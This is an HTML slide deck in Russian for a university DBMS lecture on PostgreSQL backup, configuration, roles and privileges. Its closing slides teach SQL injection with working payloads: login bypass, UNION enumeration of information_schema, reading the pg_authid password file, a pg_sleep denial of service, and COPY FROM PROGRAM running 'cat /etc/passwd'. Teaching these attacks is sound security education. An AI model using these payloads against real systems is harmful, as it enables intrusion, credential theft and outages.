@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+	<title>СУБД. Лекция 8</title>
+	<meta charset="utf-8">
+	<meta http-equiv="x-ua-compatible" content="ie=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="generator" content="Hugo 0.27" />
+	
+	<link rel="icon" href="../common/lecture.png" />
+	
+	<link rel="stylesheet" href="../shower/themes/ribbon/styles/screen-16x10.css">
+	<link rel="stylesheet" href="../css/style.css">
+	<link rel="stylesheet" href="../highlight.js/styles/idea.min.css">
+</head>
+<body class="shower list no-math">
+	<header class="caption">
+		<h1>СУБД. Лекция 8</h1>
+	</header>
+	
+<section class="slide white" style="padding: 0" id="cover">
+    <svg
+            xmlns="http://www.w3.org/2000/svg"
+            xmlns:xlink="http://www.w3.org/1999/xlink"
+            viewBox="-10 -10 895 645"
+            width="100%"
+            height="100%"
+            style="background-image: url(../park.mail.ru/img/back.png)"
+            version="1.1">
+        <image
+                xlink:href="../park.mail.ru/img/blocks.svg"
+                width="718"
+                height="548"
+                preserveAspectRatio="none"
+                x="157"
+                y="67"/>
+		<image
+                xlink:href="../park.mail.ru/img/logo.svg"
+                width="297"
+                height="130"
+                preserveAspectRatio="none"
+                x="0"
+                y="0"/>
+        <g style="font-family: 'PF Isotext Pro', sans-serif; font-size: 32px; font-stretch: semi-condensed">
+            <foreignObject x="177" y="204" width="514" height="202">
+                <div xmlns="http://www.w3.org/1999/xhtml"
+                     style="height: 100%; width: 100%; display: table; text-align: center">
+                    <div style="vertical-align: middle; display: table-cell; padding-bottom: 20px; font-weight: bold">
+                        СУБД
+                    </div>
+                </div>
+            </foreignObject>
+            <foreignObject x="534" y="534" width="326" height="65">
+                <div xmlns="http://www.w3.org/1999/xhtml"
+                     style="height: 100%; width: 100%; display: table; text-align: center; font-size: 28px">
+                    <div style="vertical-align: middle; display: table-cell">
+                        Навроцкий Артем
+                    </div>
+                </div>
+            </foreignObject>
+            <foreignObject x="177" y="465" width="240" height="134">
+                <div xmlns="http://www.w3.org/1999/xhtml"
+                     style="height: 100%; width: 100%; display: table; text-align: left">
+                    <div style="vertical-align: top; display: table-cell">
+                        Лекция 8
+                    </div>
+                </div>
+            </foreignObject>
+        <g>
+    </svg>
+</section>
+
+	<section class="slide">
+    <h2>Резервное копирование. Конфигурирование. Безопасность.</h2>
+    <ul class="compact" style="font-size: 90%">
+        <li>Резервное копирование:
+            <ul>
+                <li>Репликация ≠ резервное копирование;</li>
+                <li>Логические и физические резервные копии.</li>
+            </ul>
+        </li>
+        <li>Конфигурирование:
+            <ul>
+                <li>Общие принципы настройки;</li>
+                <li>Настройка памяти и ввода/вывода;</li>
+                <li>Табличные пространства;</li>
+                <li>Информация о текущем состоянии сервера;</li>
+            </ul>
+        </li>
+        <li>Безопасность:
+            <ul>
+                <li>Пользователи и права доступа;</li>
+                <li>SQL-injection.</li>
+            </ul>
+        </li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2 class="shout">Резервное копирование</h2>
+</section>
+
+<section class="slide">
+    <h2>Резервное копирование: Зачем?</h2>
+    <img src="backup.png" style="float: right; height: 430px; border: 1px solid black"/>
+    <ul>
+        <li>Восстановление после аварии</li>
+        <li>Человек передумал</li>
+        <li>Аудит</li>
+        <li>Тестирование</li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>Логические резервные копии</h2>
+    <ul>
+        <li>Это обычные файлы, которые можно обрабатывать с помощью стандартных текстовых редакторов.</li>
+        <li>Из них легко восстанавливать данные: достаточно просто подать файл по конвейеру на вход программы psql.</li>
+        <li>Резервное копирование и возврат данных можно выполнять по сети, то есть не на той же машине, где работает
+            сервер PostgreSQL.
+        </li>
+        <li>Процедуру можно очень гибко настраивать.</li>
+        <li>Они могут помочь избежать повреждения данных.</li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>Логические резервные копии</h2>
+    <ul>
+        <li>Для их генерации требуется работа сервера, так что процессор загружается сильнее.</li>
+        <li>В некоторых случаях логические копии оказываются объемнее исходных физических файлов. Зачастую логические
+            копии хорошо поддаются сжатию, но для этого нужно дополнительное процессорное время.
+        </li>
+        <li>В некоторых СУБД потеря точности в представлении чисел с плавающей точкой может помешать правильному
+            восстановлению данных из файлов дампа.
+        </li>
+        <li>Для восстановления данных из логической копии необходимо загружать и интерпретировать команды и
+            перестраивать индексы, что возлагает на сервер еще больше работы.
+        </li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>Физические резервные копии</h2>
+    <ul>
+        <li>Для получения физической копии нужно просто скопировать требуемые файлы в другое место. Никакой
+            дополнительной работы для их генерации выполнять не придется.
+        </li>
+        <li>Восстановление с физических копий может оказаться быстрее, потому что серверу не нужно выполнять SQL-команды
+            и строить индексы.
+        </li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>Физические резервные копии</h2>
+    <ul>
+        <li>Объем физических файлов, как правило, гораздо больше соответствующих логических копий. Обычно в файлах
+            данных очень много неиспользуемого места.
+        </li>
+        <li>Не всегда физическую копию можно перенести на другую платформу или операционную систему. Так же зачастую
+            невозмонжо восстановление на другой версии PostgreSQL.
+        </li>
+        <li>Физические резервные копии не проверяют целостность данных: если резервная копия была снята с битых данных,
+            то вы получение битые данные.
+        </li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>Что копировать?</h2>
+    <dl style="font-size: 90%">
+        <dt>Неочевидные данные</dt>
+        <dd>Не забудьте о данных, которые не бросаются в глаза, например: журнал транзакций.
+        </dd>
+
+        <dt>Код</dt>
+        <dd>В частности, триггеры и хранимые процедуры.</dd>
+
+        <dt>Конфигурация репликации</dt>
+        <dd>Для восстановления сервера, участвующего в репликации, следует включать в резервную копию все необходимые
+            для репликации файлы.
+        </dd>
+
+        <dt>Конфигурация сервера</dt>
+        <dd>Если потребуется восстановить данные после настоящей катастрофы.</dd>
+
+        <dt>Отдельные файлы операционной системы</dt>
+        <dd>На UNIX-сервере это могут быть таблицы cron, конфигурация пользователей, групп и правила sudo.</dd>
+    </dl>
+</section>
+
+<section class="slide">
+    <h2>Физическая копия: ОС</h2>
+    <h3>LVM</h3>
+    <pre style="font-size: 90%"><code
+            class="bash">lvcreate --size 100M --snapshot --name snap /dev/vg00/lvol1</code></pre>
+    <h3>btrfs, zfs</h3>
+    <pre style="font-size: 90%"><code class="bash">zfs snapshot datapool/docs@version1
+btrfs subvolume snapshot /btrfs/sub1 /btrfs/sub1/snapshot</code></pre>
+</section>
+
+<section class="slide">
+    <h2>Физическая копия: ОС</h2>
+    <h3>Плюсы:</h3>
+    <ul>
+        <li>Быстрое создание резервной копии и восстановление;</li>
+        <li>Удобно использовать перед началом обновления.</li>
+    </ul>
+    <h3>Минусы:</h3>
+    <ul>
+        <li>Были проблемы с "заклиниванием" LVM после создания снимка (например: <a
+                href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1481881">bugs.launchpad.net #1481881</a>);
+        </li>
+        <li>Для СУБД резервная копия выглядит как внезапное выключение питания.</li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>Физическая копия: pg_basebackup</h2>
+    <h3>Конфигурация:</h3>
+    <pre style="font-size: 90%"><code>archive_mode = on
+archive_command = 'test ! -f /backup/%f && cp %p /backup/%f'
+wal_writer_delay = 1s
+wal_level = hot_standby
+max_wal_senders = 5
+</code></pre>
+    <h3>Резервная копия:</h3>
+    <pre style="font-size: 90%"><code class="bash">pg_basebackup -D /tmp/backup -Ft -z -P
+pg_basebackup -D - -Ft -P    > backup.tar
+pg_basebackup -D - -Ft -P -z > backup.tgz</code></pre>
+</section>
+
+<section class="slide">
+    <h2>Физическая копия: pg_basebackup</h2>
+    <h3>Плюсы:</h3>
+    <ul>
+        <li>Быстрое создание резервной копии;</li>
+        <li>Простое восстановление;</li>
+        <li>Возможно создание резервной копии по сети.</li>
+    </ul>
+    <h3>Минусы:</h3>
+    <ul>
+        <li>Нельзя создать резервную копию одной базы данных;</li>
+        <li>Нужно иметь права на репликацию и настроенную репликацию.</li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>Логическая копия: pg_dump/pg_dumpall</h2>
+    <h3>Резервная копия:</h3>
+    <pre style="font-size: 90%"><code class="bash">pg_dump     movielens > db.sql
+pg_dump -Fc movielens > db.dump
+pg_dump -Fd movielens -j 5 -f dumpdir</code></pre>
+    <h3>Восстановление:</h3>
+    <pre style="font-size: 90%"><code class="bash">psql movielens < db.sql
+pg_restore -d movielens -Fc db.dump
+pg_restore -d movielens -Fd dumpdir</code></pre>
+</section>
+
+<section class="slide">
+    <h2>Логическая копия: pg_dump/pg_dumpall</h2>
+    <h3>Плюсы:</h3>
+    <ul>
+        <li>Возможно создание резервной копии по сети;</li>
+        <li>Возможно создание резервной копии части базы данных;</li>
+        <li>Можно восстановить резервную копию на другой версии СУБД.</li>
+    </ul>
+    <h3>Минусы:</h3>
+    <ul>
+        <li>Более высокая нагрузка на СУБД.</li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>Обновление PostgreSQL</h2>
+    <h3>pg_upgradecluster</h3>
+    <pre style="font-size: 90%"><code class="bash">sudo pg_upgradecluster -v 9.5 9.4 main</code></pre>
+    <h3>pg_upgrade</h3>
+    <pre style="font-size: 90%"><code class="bash">/usr/lib/postgresql/9.5/bin/pg_upgrade
+  --old-datadir /var/lib/postgresql/9.4/main/ \
+  --new-datadir /var/lib/postgresql/9.5/main/ \
+  --old-bindir /usr/lib/postgresql/9.4/bin/ \
+  --new-bindir /usr/lib/postgresql/9.4/bin/
+</code></pre>
+</section>
+
+<section class="slide">
+    <h2 class="shout">Конфигурирование</h2>
+</section>
+
+<section class="slide">
+    <h2>Конфигурирование</h2>
+    <ul>
+        <li>pg_hba.conf</li>
+        <li>pg_ident.conf</li>
+        <li>postgresql.conf</li>
+    </ul>
+    <p>Рекомендуется добавить в конец файла <code>postgresql.conf</code> строки вида:</p>
+    <pre><code># include files ending in '.conf' from
+include_dir = 'conf.d'</code></pre>
+    <p>Специфические настройки при этом хранить в директории <code>conf.d</code>.</p>
+    <p>Если один параметр указан несколько раз - то побеждает последний.</p>
+    <footer>
+        <a href="https://wiki.postgresql.org/wiki/Tuning_Your_PostgreSQL_Server">https://wiki.postgresql.org/wiki/Tuning_Your_PostgreSQL_Server</a>
+    </footer>
+</section>
+
+<section class="slide">
+    <h2>Конфигурирование: durability</h2>
+    <dl>
+        <dt>synchronous_commit = on</dt>
+        <dd>
+            <p>Определяет, будет ли сервер при фиксировании транзакции ждать, пока записи из WAL сохранятся на
+                диске.</p>
+            <p>Допустимые значения: on, remote_apply, remote_write, local и off.</p>
+            <p>Этот параметр можно изменить в любое время:</p>
+            <pre><code class="sql">SET LOCAL synchronous_commit = ON</code></pre>
+        </dd>
+
+        <dt>wal_writer_delay = 200ms</dt>
+        <dd>
+            <p>Определяет, как часто процесс записи WAL будет сбрасывать WAL на диск.</p>
+        </dd>
+    </dl>
+</section>
+
+<section class="slide">
+    <h2>Контрольные суммы</h2>
+    <pre><code class="bash">/usr/lib/postgresql/9.5/bin/initdb \
+    --data-checksums main</code></pre>
+    <p>Указывает на необходимость проверки системой ввода/вывода контрольных сумм страниц для обнаружения повреждённых
+        данных, так как по умолчанию проверка не производится.</p>
+    <p>Включение проверки может в значительной мере оказать влияние на производительность.</p>
+    <p>Устанавливается на этапе развёртывания кластера, и далее не может быть изменена.</p>
+    <footer>
+        <a href="https://www.postgresql.org/message-id/5717332F.3020709%40postgrespro.ru">https://www.postgresql.org/message-id/5717332F.3020709%40postgrespro.ru</a>
+    </footer>
+</section>
+
+<section class="slide">
+    <h2>Настройка использования памяти</h2>
+    <ul>
+        <li>Определить абсолютный верхний предел объема памяти, которую PostgreSQL может использовать.</li>
+        <li>Определить, сколько памяти PostgreSQL будет использовать на каждое соединение, например для буферов
+            сортировки и временных таблиц.
+        </li>
+        <li>Определить, сколько памяти нужно операционной системе для нормальной работы. Сюда следует включить и память
+            для других программ, работающих на той же машине, например периодически выполняемых заданий.
+        </li>
+        <li>Если сервер залез в swap - то всё пропало.</li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>Настройка использования памяти</h2>
+    <dl>
+        <dt>shared_buffers (integer)</dt>
+        <dd>Задаёт объём памяти, который будет использовать сервер баз данных для буферов в разделяемой памяти (~25-40% RAM).</dd>
+
+        <dt>effective_cache_size (integer)</dt>
+        <dd>Определяет представление планировщика об эффективном размере дискового кеша, доступном для одного запроса.</dd>
+
+        <dt>work_mem (integer)</dt>
+        <dd>Задаёт объём памяти, который будет использоваться для внутренних операций сортировки и хеш-таблиц.</dd>
+
+        <dt>maintenance_work_mem (integer)</dt>
+        <dd>Задаёт максимальный объём памяти для операций обслуживания БД, в частности VACUUM, CREATE INDEX и ALTER TABLE ADD FOREIGN KEY.</dd>
+    </dl>
+</section>
+
+<section class="slide">
+    <h2>Сетевые подключения</h2>
+    <h3>Внешний интерфейс</h3>
+    <pre><code>listen_addresses = '*'</code></pre>
+    <h3>Лимит на общее кол-во подключений</h3>
+    <pre><code>max_connections = 100</code></pre>
+    <div class="next">
+        <h3>Лимит на кол-во подключений с одного IP</h3>
+        <pre><code class="bash">iptables -A INPUT -p tcp --syn --dport 5432 \
+    -m connlimit --connlimit-above 15 \
+    -j REJECT --reject-with tcp-reset
+    </code></pre>
+    </div>
+</section>
+
+<section class="slide">
+    <h2>Табличные пространства</h2>
+    <pre><code class="sql">CREATE TABLESPACE fastspace
+    LOCATION '/ssd1/postgresql/data';
+
+CREATE TABLE cinemas (
+        id serial,
+        name text,
+        location text
+) TABLESPACE fastspace;
+
+CREATE INDEX code_idx ON films (code)
+        TABLESPACE indexspace;</code></pre>
+</section>
+
+<section class="slide">
+    <h2>Мониторинг: инструменты Unix</h2>
+    <pre style="font-size: 50%"><code class="bash">$ ps auxww | grep ^postgres
+postgres  15551  0.0  0.1  57536  7132 pts/0  S   18:02  0:00 postgres -i
+postgres  15554  0.0  0.0  57536  1184 ?      Ss  18:02  0:00 postgres: writer process
+postgres  15555  0.0  0.0  57536   916 ?      Ss  18:02  0:00 postgres: checkpointer process
+postgres  15556  0.0  0.0  57536   916 ?      Ss  18:02  0:00 postgres: wal writer process
+postgres  15557  0.0  0.0  58504  2244 ?      Ss  18:02  0:00 postgres: autovacuum launcher process
+postgres  15558  0.0  0.0  17512  1068 ?      Ss  18:02  0:00 postgres: stats collector process
+postgres  15582  0.0  0.0  58772  3080 ?      Ss  18:04  0:00 postgres: joe runbug 127.0.0.1 idle
+postgres  15606  0.0  0.0  58772  3052 ?      Ss  18:07  0:00 postgres: tgl regression [local] SELECT waiting
+postgres  15610  0.0  0.0  58772  3056 ?      Ss  18:07  0:00 postgres: tgl regression [local] idle in transaction</code></pre>
+</section>
+
+<section class="slide">
+    <h2>Мониторинг: системная инфомация</h2>
+    <dl>
+        <dt>pg_stat_activity</dt>
+        <dd>Информацией по текущей активности процесса.</dd>
+
+        <dt>pg_stat_all_tables</dt>
+        <dd>Статистика по обращениям к таблицам.</dd>
+
+        <dt>pg_stat_all_indexes</dt>
+        <dd>Статистика по обращениям к индексам.</dd>
+
+        <dt>pg_statio_all_tables</dt>
+        <dd>Статистика по операциям ввода/вывода.</dd>
+
+        <dt>pg_locks</dt>
+        <dd>Блокировки.</dd>
+    </dl>
+</section>
+
+<section class="slide">
+    <h2 class="shout">Безопасность</h2>
+</section>
+
+<section class="slide">
+    <h2>Терминология</h2>
+    <dl>
+        <dt>Аутентификация</dt>
+        <dd>Кто вы такой?</dd>
+
+        <dt>Авторизация</dt>
+        <dd>Что вам разрешено делать?</dd>
+
+        <dt>Контроль доступа</dt>
+        <dd>Какие данные вам разрешено видеть и/или изменять?</dd>
+
+        <dt>Привилегии и разрешения</dt>
+        <dd>Способ представления в PostgreSQL права доступа.
+            <p><dfn>Объектные привилегии</dfn> разрешают доступ к конкретным объектам.</p>
+            <p><dfn>Глобальные привилегии</dfn> позволяют что-то делать с самим сервером.</p>
+        </dd>
+    </dl>
+</section>
+
+<section class="slide">
+    <h2>Аутентификация: pg_hba.conf</h2>
+    <pre style="font-size: 70%"><code>local      database  user  auth-method  [auth-options]
+host       database  user  address  auth-method  [auth-options]
+hostssl    database  user  address  auth-method  [auth-options]
+hostnossl  database  user  address  auth-method  [auth-options]
+host       database  user  IP-address  IP-mask  auth-method  [auth-options]
+hostssl    database  user  IP-address  IP-mask  auth-method  [auth-options]
+hostnossl  database  user  IP-address  IP-mask  auth-method  [auth-options]</code></pre>
+    <pre style="font-size: 70%"><code class="bash">
+# TYPE  DATABASE        USER            ADDRESS                 METHOD
+local   all             all                                     trust
+host    all             all             127.0.0.1/32            trust
+host    all             all             ::1/128                 trust
+host    postgres        all             192.168.12.10/32        md5
+host    all             all             .example.com            md5 map=omicron
+host    all             all             192.168.54.1/32         reject
+local   all             @admins,+support                        md5</code></pre>
+</section>
+
+<section class="slide">
+    <h2>Аутентификация: методы</h2>
+    <dl>
+        <dt>trust</dt>
+        <dd>Разрешает безусловное подключение.</dd>
+
+        <dt>reject</dt>
+        <dd>Отклоняет подключение безусловно.</dd>
+
+        <dt>md5, password</dt>
+        <dd>Требует от клиента предоставить для аутентификации пароль.</dd>
+
+        <dt>gss, sspi</dt>
+        <dd>Для SSO-аутентификации: GSSAPI (Kerberos), SSPI (Windows).</dd>
+
+        <dt>peer</dt>
+        <dd>Получает имя пользователя операционной системы (unix socket).</dd>
+
+        <dt>ldap, radius</dt>
+        <dd>Проводит аутентификацию, используя сервер LDAP или RADIUS.</dd>
+    </dl>
+</section>
+
+<section class="slide">
+    <h2>Аутентификация: ошибки</h2>
+    <h3>Подключение успешно, но не понятно как авторизовать</h3>
+    <pre style="font-size: 80%"><code>FATAL: no pg_hba.conf entry for host "1.2.3.4", user "foo", database "bar"</code></pre>
+
+    <h3>Не верные данные для авторизации пользователя или не корректная настройка SSO</h3>
+    <pre style="font-size: 80%"><code>FATAL: password authentication failed for user "foo"</code></pre>
+
+    <h3>Указанное имя пользователя базы данных не найдено</h3>
+    <pre style="font-size: 80%"><code>FATAL: user "foo" does not exist</code></pre>
+
+    <h3>Указанная база данных не найдена</h3>
+    <pre style="font-size: 80%"><code>FATAL: database "testdb" does not exist</code></pre>
+</section>
+
+<section class="slide">
+    <h2>Аутентификация: pg_ident.conf</h2>
+    <pre style="font-size: 90%"><code class="bash">
+# map-name system-username            database-username
+mymap      /^(.*)@mydomain\.com$      \1
+mymap      /^(.*)@otherdomain\.com$   guest
+
+omicron    bryanh                     bryanh
+omicron    ann                        ann
+omicron    robert                     bob
+omicron    bryanh                     guest1</code></pre>
+</section>
+
+<section class="slide">
+    <h2>Авторизация: роли</h2>
+    <p>Роль можно рассматривать как пользователя базы данных или как группу пользователей, в зависимости от того, как роль настроена.</p>
+    <pre><code class="sql">CREATE ROLE bar;
+CREATE ROLE foo WITH LOGIN PASSWORD 'passw0rd';
+CREATE ROLE admin WITH CREATEDB CREATEROLE;
+
+DROP ROLE foo;
+SELECT rolname FROM pg_roles;</code></pre>
+</section>
+
+<section class="slide">
+    <h2>Роли: параметры</h2>
+    <dl style="font-size: 70%">
+        <dt>SUPERUSER, NOSUPERUSER</dt>
+        <dd>Будет ли эта роль «суперпользователем».</dd>
+
+        <dt>CREATEDB, NOCREATEDB</dt>
+        <dd>Сможет ли роль создавать базы данных.</dd>
+
+        <dt>CREATEROLE, NOCREATEROLE</dt>
+        <dd>Сможет ли роль создавать новые роли.</dd>
+
+        <dt>INHERIT, NOINHERIT</dt>
+        <dd>Будет ли роль «наследовать» права ролей, членом которых она является.</dd>
+
+        <dt>LOGIN, NOLOGIN</dt>
+        <dd>Разрешается ли новой роли вход на сервер.</dd>
+
+        <dt>REPLICATION, NOREPLICATION</dt>
+        <dd>Сможет ли новая роль запускать потоковую репликацию.</dd>
+
+        <dt>CONNECTION LIMIT предел_подключений</dt>
+        <dd>Лимит на колчиство параллельных подключений.</dd>
+
+        <dt>PASSWORD пароль
+        <dd>Задаёт пароль роли.</dd>
+
+        <dt>IN ROLE имя_роли, IN GROUP имя_роли</dt>
+        <dd>Перечисляются одна или несколько существующих ролей, в которые будет включена новая роль.</dd>
+    </dl>
+</section>
+
+<section class="slide">
+    <h2>Авторизация: роли</h2>
+    <h3>Наследование</h3>
+    <pre><code class="sql">CREATE ROLE joe LOGIN INHERIT;
+CREATE ROLE admin NOINHERIT;
+CREATE ROLE wheel NOINHERIT;
+GRANT admin TO joe;
+GRANT wheel TO admin;</code></pre>
+    <h3>Ограничение полномочий</h3>
+    <pre><code class="sql">SET ROLE admin;
+SET ROLE wheel;
+
+SET ROLE joe;
+SET ROLE NONE;
+RESET ROLE;</code></pre>
+</section>
+
+<section class="slide">
+    <h2>Права на объекты</h2>
+    <pre style="font-size: 90%"><code class="sql">GRANT { { SELECT | INSERT | UPDATE | DELETE | TRUNCATE
+        | REFERENCES | TRIGGER }
+    [, ...] | ALL [ PRIVILEGES ] }
+    ON { [ TABLE ] имя_таблицы [, ...]
+         | ALL TABLES IN SCHEMA имя_схемы [, ...] }
+    TO указание_роли [, ...] [ WITH GRANT OPTION ]
+
+GRANT { { CREATE | CONNECT | TEMPORARY | TEMP } [, ...]
+        | ALL [ PRIVILEGES ] }
+    ON DATABASE имя_бд [, ...]
+    TO указание_роли [, ...] [ WITH GRANT OPTION ]
+
+GRANT SELECT ON mytable TO PUBLIC;
+GRANT SELECT, UPDATE, INSERT ON mytable TO admin;
+GRANT SELECT (col1), UPDATE (col1) ON mytable TO miriam_rw;
+</code></pre>
+</section>
+
+<section class="slide">
+    <h2 class="shout">SQL-injection</h2>
+</section>
+
+<section class="slide">
+    <h2>SQL-injection: Строковой параметр</h2>
+    <ul>
+        <li>http://xxx/news.php?id=1
+            <pre><code class="sql">SELECT * FROM news WHERE id='<mark>$id</mark>'</code></pre>
+        </li>
+        <li>http://xxx/news.php?id=1'
+            <pre><code class="sql">SELECT * FROM news WHERE id='<mark>1'</mark>'
+</code></pre>
+            <pre><code>pg_query(): Query failed: ERROR: unterminated quoted…
+</code></pre>
+        </li>
+        <li>http://xxx/news.php?id=1'%20--%20
+            <pre><code class="sql">SELECT * FROM news WHERE id='<mark>1' -- </mark>'
+</code></pre>
+        </li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>SQL-injection: Авторизация</h2>
+    <div style="font-size: 90%">
+<pre><code class="sql">SELECT * FROM users
+WHERE login='<mark>$login</mark>' AND pass='<mark>$pass</mark>'</code></pre>
+        <pre><code class="sql">
+SELECT * FROM users
+WHERE login='<mark>Admin' -- </mark>' AND pass='<mark>123</mark>'
+</code></pre>
+        <pre><code class="sql">  
+SELECT * FROM users
+WHERE login='<mark>Admin</mark>' AND pass='<mark>123' OR login='Admin' -- </mark>'
+</code></pre>
+        <pre><code class="sql">
+SELECT * FROM users
+WHERE (login='Admin' AND pass='123') OR (login='Admin')
+</code></pre>
+    </div>
+</section>
+
+<section class="slide">
+    <h2>SQL-injection: UNION</h2>
+    <ul>
+        <li><code>http://xxx/news.php?id=1' UNION SELECT null --</code>
+            <pre><code class="sql">SELECT * FROM news WHERE id='<mark>1' UNION SELECT null --</mark>'</code></pre>
+            <code>pg_query(): Query failed: ERROR: each UNION query must have the same number of columns</code></li>
+
+        <li><code>http://xxx/news.php?id=1' UNION SELECT null, null --</code><br/>
+            О! Отобразилось точно также как и <code>http://xxx/news.php?id=1</code></li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>SQL-injection: GROUP BY/ORDER BY</h2>
+    <ul>
+        <li>http://xxx/news.php?id=1' GROUP BY 1, 2, 3, 4 --</li>
+        <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>1'
+GROUP BY 1, 2, 3, 4 --</mark>'</code></pre>
+        <pre><code>pg_query(): Query failed: ERROR: GROUP BY position 3</code></pre>
+        </li>
+
+        <li>http://xxx/news.php?id=1' ORDER BY 4 --</li>
+        <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>1'
+ORDER BY 4 --</mark>'</code></pre>
+        <pre><code>pg_query(): Query failed: ERROR: ORDER BY position 4</code></pre>
+        </li>
+
+        <li><code>http://xxx/news.php?id=1' GROUP BY 1, 2</code><br/>
+            <code>http://xxx/news.php?id=1' ORDER BY 2</code><br/>
+            О! Отобразилось точно также как и <code>http://xxx/news.php?id=1</code></li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>SQL-injection: INFORMATION_SCHEMA</h2>
+    <ul>
+        <li><code>http://xxx/news.php?id=-1' UNION SELECT table_schema, table_name FROM information_schema.tables
+            --</code>
+            <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>-1'
+UNION
+SELECT table_schema, table_name
+FROM information_schema.tables --</mark>'</code></pre>
+        </li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>SQL-injection: Работа с файлами</h2>
+    <ul>
+        <li><code>http://xxx/news.php?id=-1' UNION SELECT '.', pg_ls_dir('.') --</code></li>
+        <li><code>http://xxx/news.php?id=-1' UNION SELECT 'pg_catalog.pg_authid', encode(&#8202;pg_read_binary_file(&#8202;pg_relation_filepath(&#8202;'pg_catalog.pg_authid')),
+            'hex') --</code></li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>SQL-injection: DOS ататка</h2>
+    <ul>
+        <li><code>http://xxx/news.php?id=-1' UNION SELECT NULL, pg_sleep(3600) --</code><br/>
+            <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>-1'
+UNION SELECT NULL, pg_sleep(3600) --</mark>'</code></pre>
+        </li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>SQL-injection: Fatality</h2>
+    <img class="next" style="position: absolute; bottom: 0px; height: 200px; right: 0px" src="toasty.png"/>
+    <ul>
+        <li><code>http://xxx/news.php?id=-1'; CREATE TEMP TABLE tmp1 (content text); COPY tmp1 FROM PROGRAM 'cat
+            /etc/passwd'; UPDATE news SET body = (SELECT string_agg(content, E'\n') FROM tmp1) WHERE id = 1;
+            --</code><br/>
+            <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>-1';
+CREATE TEMP TABLE tmp1 (content text);
+COPY tmp1 FROM PROGRAM 'cat /etc/passwd';
+UPDATE news SET body = (
+    SELECT string_agg(content, E'\n') FROM tmp1
+) WHERE id = 1;
+--</mark>'</code></pre>
+        </li>
+    </ul>
+</section>
+
+	
+<section class="slide white" style="padding: 0" id="contacts">
+    <svg
+            xmlns="http://www.w3.org/2000/svg"
+            xmlns:xlink="http://www.w3.org/1999/xlink"
+            viewBox="-10 -10 895 645"
+            width="100%"
+            height="100%"
+            style="background-image: url(../park.mail.ru/img/back.png)"
+            version="1.1">
+        <image
+                xlink:href="../park.mail.ru/img/blocks.svg"
+                width="718"
+                height="548"
+                preserveAspectRatio="none"
+                x="157"
+                y="67"/>
+		<image
+                xlink:href="../park.mail.ru/img/logo.svg"
+                width="297"
+                height="130"
+                preserveAspectRatio="none"
+                x="0"
+                y="0"/>
+        <g style="font-family: 'PF Isotext Pro', sans-serif; font-size: 32px; font-stretch: semi-condensed">
+            <foreignObject x="177" y="204" width="514" height="202">
+                <div xmlns="http://www.w3.org/1999/xhtml"
+                     style="height: 100%; width: 100%; display: table; text-align: center">
+                    <div style="vertical-align: middle; display: table-cell; padding-bottom: 20px; font-weight: bold">
+                        Навроцкий Артем
+                        
+                        
+                        <div>E-mail: bozaro@yandex.ru</div>
+                        
+                    </div>
+                </div>
+            </foreignObject>
+            <foreignObject x="534" y="534" width="326" height="65">
+                <div xmlns="http://www.w3.org/1999/xhtml"
+                     style="height: 100%; width: 100%; display: table; text-align: center; font-size: 28px; font-weight: bold">
+                    <div style="vertical-align: middle; display: table-cell">
+                        Спасибо за внимание!
+                    </div>
+                </div>
+            </foreignObject>
+        <g>
+    </svg>
+</section>
+
+	<div class="progress"></div>
+	<script src="../js/common.js"></script>
+	<script src="../shower/shower.min.js"></script>
+	<script src="../highlight.js/highlight.min.js"></script>
+	<script>hljs.initHighlightingOnLoad();</script>
+	
+
+
+	<script src="../mathjax/MathJax.js?config=AM_HTMLorMML-full"></script>
+	<script>
+MathJax.Hub.Config({
+	asciimath2jax: {
+		inlineMath: [['$','$'],['\\(','\\)']],
+		processClass: "math",
+		ignoreClass: "no-math"
+	},
+	root: "..\/mathjax/"
+});
+	</script>
+
+
+</body>
+</html>
